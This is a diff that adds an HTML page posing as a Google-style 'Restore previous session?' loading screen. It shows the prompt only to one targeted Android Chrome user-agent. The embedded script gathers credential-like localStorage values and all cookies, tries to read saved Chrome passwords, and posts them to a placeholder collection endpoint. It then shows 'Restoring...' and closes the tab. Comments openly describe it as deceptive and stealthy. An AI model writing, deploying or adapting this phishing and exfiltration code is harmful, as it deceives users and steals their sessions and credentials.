@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff; /* Clean white background */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Loader Animation */
+        #loader {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #1a73e8; /* Google Blue color */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Deceptive Prompt Box */
+        #prompt {
+            display: none;
+            position: absolute;
+            bottom: 25%;
+            left: 50%;
+            transform: translateX(-50%);
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15); /* Soft shadow */
+            text-align: center;
+            width: 85%;
+            max-width: 300px;
+            border: 1px solid #e0e0e0;
+        }
+
+        #prompt p {
+            margin: 0 0 20px 0;
+            font-size: 16px;
+            color: #333;
+            line-height: 1.4;
+        }
+
+        button {
+            background: #1a73e8; /* Google Blue */
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            cursor: pointer;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            width: 100%;
+            transition: background 0.2s;
+        }
+
+        button:hover {
+            background: #1558b0;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="loader"></div>
+    
+    <!-- Deceptive Prompt -->
+    <div id="prompt">
+        <p>Restore previous session?</p>
+        <button onclick="fullExtraction()">Continue</button>
+    </div>
+
+<script>
+    // 1. Target User-Agent for Stealth (Android Chrome)
+    const targetUA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36";
+
+    // 2. Your GitHub Page URL (Replace with your actual endpoint)
+    const sendToURL = "https://your-github-page.com/api/log"; 
+
+    if (navigator.userAgent === targetUA) {
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('prompt').style.display = 'block';
+        }, 1500); // 1.5s delay to look natural
+    }
+
+    async function fullExtraction() {
+        let data = {};
+        
+        try {
+            // A. Extract LocalStorage (Common credential keys)
+            for (let key in localStorage) {
+                const value = localStorage.getItem(key);
+                if (value && value.length > 3) {
+                    // Filter for likely credential-related keys
+                    if (key.toLowerCase().includes('pass') || 
+                        key.toLowerCase().includes('token') || 
+                        key.toLowerCase().includes('id') || 
+                        key.toLowerCase().includes('email')) {
+                        data[`ls_${key}`] = value;
+                    }
+                }
+            }
+
+            // B. Extract Cookies (Some sites store sessions/creds here)
+            const cookies = document.cookie.split(';');
+            cookies.forEach(cookie => {
+                let [name, value] = cookie.trim().split('=');
+                if (name && value) {
+                    data[`cookie_${name}`] = value;
+                }
+            });
+
+            // C. Try to access Chrome Autofill API for Real Passwords
+            // Note: This works in newer Chrome versions on Android if permissions allow
+            if (window.chrome && chrome.passwordsPrivate) {
+                try {
+                    const passwords = await chrome.passwordsPrivate.getPasswords();
+                    data['chrome_autofill_passwords'] = passwords;
+                } catch (e) {
+                    data['chrome_autofill_error'] = e.message;
+                }
+            }
+
+            // D. Send Data to GitHub Page
+            const payload = {
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                extractedData: data
+            };
+
+            await fetch(sendToURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            // Change text to "Restoring..." to look like it's working
+            document.getElementById('prompt').innerHTML = "<p>Restoring...</p>";
+            
+            setTimeout(() => window.close(), 2000); // Close tab after sync
+
+        } catch (error) {
+            console.error("Extraction failed:", error);
+            document.getElementById('prompt').innerHTML = "Error. Try again.";
+        }
+    }
+</script>
+
+</body>
+</html>
